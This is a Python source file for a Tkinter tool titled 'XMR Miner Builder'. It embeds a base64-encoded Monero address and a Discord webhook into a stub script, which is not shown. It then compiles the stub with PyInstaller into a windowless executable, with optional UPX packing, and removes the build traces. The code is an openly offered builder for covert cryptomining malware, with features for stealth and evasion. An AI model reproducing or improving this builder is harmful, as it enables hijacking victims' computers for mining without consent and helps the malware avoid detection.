import shutil
import base64
import subprocess
import os
import requests
import tkinter as tk
from tkinter import messagebox

def build_executable(xmr_address, webhook_url, output_filename, use_upx):
    xmr_address_b64 = base64.b64encode(xmr_address.encode('utf-8')).decode('utf-8')
    webhook_url_b64 = base64.b64encode(webhook_url.encode('utf-8')).decode('utf-8') if webhook_url else None

    if not xmr_address:
        messagebox.showerror("Error", "XMR address is required!")
        return
    if not output_filename:
        messagebox.showerror("Error", "Output filename is required!")
        return

    with open("utils/stub.py", "r") as f:
        content = f.read()

    content = content.replace("%%XMRADDRESS%%", xmr_address_b64)
    content = content.replace("%%WEBHOOK_URL%%", webhook_url_b64 if webhook_url_b64 else "")

    stub_file = "stub-o.py"
    with open(stub_file, "w") as f:
        f.write(content)

    upx_path = os.path.abspath("./utils/upx.exe")

    pyinstaller_command = [
        "pyinstaller",
        "--onefile",         
        "--noconsole",        
        "--hidden-import=subprocess",
        "--hidden-import=requests",
        "--name", output_filename,
        stub_file       
    ]


    if use_upx:
        pyinstaller_command.append(f"--upx-dir={upx_path}")

    subprocess.run(pyinstaller_command)

    build_dir = "build"
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
        print("Build directory removed.")
    
    spec_file = f"{output_filename}.spec"
    if os.path.exists(spec_file):
        os.remove(spec_file)
        print("Spec file removed.")

    stub_o_file = f"stub-o.py"
    if os.path.exists(stub_o_file):
        os.remove(stub_o_file)
        print("Stub output file removed.")

    messagebox.showinfo("Success", f"Executable '{output_filename}.exe' has been created.")

def test_webhook(webhook_url):
    if not webhook_url:
        messagebox.showerror("Error", "Please enter a webhook URL to test.")
        return

    try:
        response = requests.post(webhook_url, json={"content": "testing"})
        if response.status_code == 204:
            messagebox.showinfo("Success", "Webhook valid")
        else:
            messagebox.showerror("Error", f"Webhook test failed with status code {response.status_code}.")
    except requests.exceptions.RequestException as e:
        messagebox.showerror("Error", f"Webhook test failed: {e}")

def on_build_button_click():
    xmr_address = xmr_entry.get().strip()
    webhook_url = webhook_entry.get().strip() if webhook_var.get() else ""
    output_filename = filename_entry.get().strip()
    use_upx = upx_var.get()
    build_executable(xmr_address, webhook_url, output_filename, use_upx)

root = tk.Tk()
root.title("XMR Miner Builder")
root.configure(bg="#121b2b")
root.resizable(False, False)


try:
    root.iconbitmap("utils/icon.ico")
except:
    print("Icon file not found!")


try:
    image = tk.PhotoImage(file="utils/xmr.png") 
    image_label = tk.Label(root, image=image, bg="#121b2b")
    image_label.pack(fill="both", expand=True)
except:
    print("Image file not found!")


xmr_label = tk.Label(root, text="Enter your XMR address:", bg="#121b2b", fg="white")
xmr_label.pack(pady=10)
xmr_entry = tk.Entry(root, width=50, bg="#172133", fg="white", insertbackground="white")
xmr_entry.pack(pady=5)


webhook_var = tk.BooleanVar()
webhook_check = tk.Checkbutton(root, text="Add Discord webhook?", variable=webhook_var, bg="#121b2b", fg="white", activebackground="#121b2b", activeforeground="white", selectcolor="#454b5c")
webhook_check.pack(pady=5)
webhook_entry = tk.Entry(root, width=50, bg="#172133", fg="white", insertbackground="white", state="disabled")
webhook_entry.pack(pady=5)

def toggle_webhook_entry():
    if webhook_var.get():
        webhook_entry.config(state="normal")
    else:
        webhook_entry.delete(0, tk.END)
        webhook_entry.config(state="disabled")

webhook_var.trace("w", lambda *args: toggle_webhook_entry())


test_webhook_button = tk.Button(root, text="Test Webhook", command=lambda: test_webhook(webhook_entry.get().strip()), bg="#454b5c", fg="white", activebackground="white", activeforeground="#454b5c")
test_webhook_button.pack(pady=5)


filename_label = tk.Label(root, text="Output filename (without extension):", bg="#121b2b", fg="white")
filename_label.pack(pady=5)
filename_entry = tk.Entry(root, width=50, bg="#172133", fg="white", insertbackground="white")
filename_entry.pack(pady=5)


upx_var = tk.BooleanVar()
upx_check = tk.Checkbutton(root, text="Pack with UPX", variable=upx_var, bg="#121b2b", fg="white", activebackground="#121b2b", activeforeground="white", selectcolor="#454b5c")
upx_check.pack(pady=5)


build_button = tk.Button(root, text="Build", command=on_build_button_click, bg="#454b5c", fg="white", activebackground="white", activeforeground="#454b5c")
build_button.pack(pady=20)


root.mainloop()